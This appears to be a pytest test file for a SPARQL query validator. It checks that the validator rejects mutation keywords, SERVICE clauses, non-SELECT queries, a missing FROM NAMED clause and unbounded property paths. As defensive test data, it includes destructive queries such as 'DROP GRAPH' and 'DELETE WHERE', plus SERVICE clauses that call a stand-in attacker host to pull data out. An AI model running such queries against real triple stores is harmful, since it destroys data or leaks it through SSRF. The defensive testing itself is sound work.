"""T1 — SparqlValidator: mutation denylist + structural checks (AC1, AC2).

The validator is pure Python, no AWS dependency.  All tests run offline without boto3
or rdflib.  Key invariants:
  - All 9 SPARQL Update keywords rejected (word-boundary, case-insensitive).
  - SERVICE clause rejected (SSRF / federation vector).
  - CONSTRUCT, ASK, DESCRIBE → not_a_select.
  - SELECT without FROM NAMED → missing_from_named (even with inline GRAPH {}).
  - SELECT with unbounded * path → unbounded_property_path.
  - Well-formed SELECT with FROM NAMED + GRAPH → valid.
"""

from __future__ import annotations

import pytest

from graphrag.text2sparql._validator import SparqlValidator, ValidationResult

_VALID_SELECT = (
    "SELECT ?s "
    "FROM NAMED <urn:graph:normative> "
    "WHERE { GRAPH <urn:graph:normative> { ?s a <https://schema.org/Policy> } }"
)

_validator = SparqlValidator()


# ── Mutation keyword denylist ─────────────────────────────────────────────────


@pytest.mark.parametrize(
    "query",
    [
        "INSERT DATA { <urn:x> <urn:p> <urn:z> }",
        "DELETE WHERE { ?s ?p ?o }",
        "DROP GRAPH <urn:graph:normative>",
        "CLEAR GRAPH <urn:graph:normative>",
        "LOAD <http://example.org/data.ttl>",
        "CREATE GRAPH <urn:graph:new>",
        "COPY <urn:graph:a> TO <urn:graph:b>",
        "MOVE <urn:graph:a> TO <urn:graph:b>",
        "ADD <urn:graph:a> TO <urn:graph:b>",
        # Case-insensitive
        "insert data { <urn:x> <urn:p> <urn:z> }",
        "Delete WHERE { ?s ?p ?o }",
    ],
)
def test_mutation_keyword_rejected(query: str) -> None:
    result = _validator.validate(query)
    assert result == ValidationResult(valid=False, rule="mutation_keyword")


def test_mutation_keyword_in_string_literal_is_false_reject() -> None:
    # Conservative denylist: a mutation keyword inside a string literal is a false-reject.
    # This is the accepted trade-off per ADR-0011 — the IAM backstop is the guarantee.
    query = (
        "SELECT ?s FROM NAMED <urn:graph:normative> "
        "WHERE { GRAPH <urn:graph:normative> { ?s <urn:p> ?n "
        'FILTER(?n = "DROP GRAPH test") } }'
    )
    result = _validator.validate(query)
    assert result == ValidationResult(valid=False, rule="mutation_keyword")


def test_valid_select_is_accepted() -> None:
    result = _validator.validate(_VALID_SELECT)
    assert result == ValidationResult(valid=True)


# ── SERVICE clause (SSRF guard) ───────────────────────────────────────────────


@pytest.mark.parametrize(
    "query",
    [
        (
            "SELECT ?s FROM NAMED <urn:graph:normative> "
            "WHERE { SERVICE <http://attacker.example/collect> { ?s ?p ?o } }"
        ),
        (
            "SELECT ?s FROM NAMED <urn:graph:normative> "
            "WHERE { service <http://attacker.example/collect> { ?s ?p ?o } }"
        ),
    ],
)
def test_service_clause_rejected(query: str) -> None:
    result = _validator.validate(query)
    assert result == ValidationResult(valid=False, rule="service_clause")


# ── Structural validator ──────────────────────────────────────────────────────


def test_construct_rejected_as_not_a_select() -> None:
    query = (
        "CONSTRUCT { ?s a <urn:T> } "
        "FROM NAMED <urn:graph:normative> "
        "WHERE { GRAPH <urn:graph:normative> { ?s a <urn:T> } }"
    )
    result = _validator.validate(query)
    assert result == ValidationResult(valid=False, rule="not_a_select")


def test_ask_rejected_as_not_a_select() -> None:
    query = "ASK FROM NAMED <urn:graph:normative> WHERE { ?s ?p ?o }"
    result = _validator.validate(query)
    assert result == ValidationResult(valid=False, rule="not_a_select")


def test_select_without_from_named_rejected() -> None:
    query = "SELECT ?s WHERE { ?s a <https://schema.org/Policy> }"
    result = _validator.validate(query)
    assert result == ValidationResult(valid=False, rule="missing_from_named")


def test_select_with_graph_only_no_from_named_rejected() -> None:
    # Inline GRAPH {} without the dataset-level FROM NAMED clause is rejected.
    # The partition scope must be declared at dataset level per ADR-0012.
    query = "SELECT ?s WHERE { GRAPH <urn:graph:normative> { ?s a <https://schema.org/Policy> } }"
    result = _validator.validate(query)
    assert result == ValidationResult(valid=False, rule="missing_from_named")


@pytest.mark.parametrize(
    "query",
    [
        # biz:hasChunk* — unbounded * on a prefixed name
        (
            "SELECT ?s FROM NAMED <urn:graph:normative> "
            "WHERE { GRAPH <urn:graph:normative> { ?s biz:hasChunk* ?o } }"
        ),
        # rdf:type* — unbounded * on a well-known prefix
        (
            "SELECT ?s FROM NAMED <urn:graph:normative> "
            "WHERE { GRAPH <urn:graph:normative> { ?s rdf:type* ?o } }"
        ),
        # biz:knows+ — unbounded + (also unbounded)
        (
            "SELECT ?s FROM NAMED <urn:graph:normative> "
            "WHERE { GRAPH <urn:graph:normative> { ?s biz:knows+ ?o } }"
        ),
        # (biz:a|biz:b)* — grouped path with unbounded *
        (
            "SELECT ?s FROM NAMED <urn:graph:normative> "
            "WHERE { GRAPH <urn:graph:normative> { ?s (biz:a|biz:b)* ?o } }"
        ),
    ],
)
def test_unbounded_property_path_rejected(query: str) -> None:
    result = _validator.validate(query)
    assert result == ValidationResult(valid=False, rule="unbounded_property_path")


def test_valid_select_with_from_named_and_graph_accepted() -> None:
    # The canonical happy-path query: FROM NAMED at dataset level + GRAPH {} match clause.
    result = _validator.validate(_VALID_SELECT)
    assert result.valid is True
    assert result.rule is None
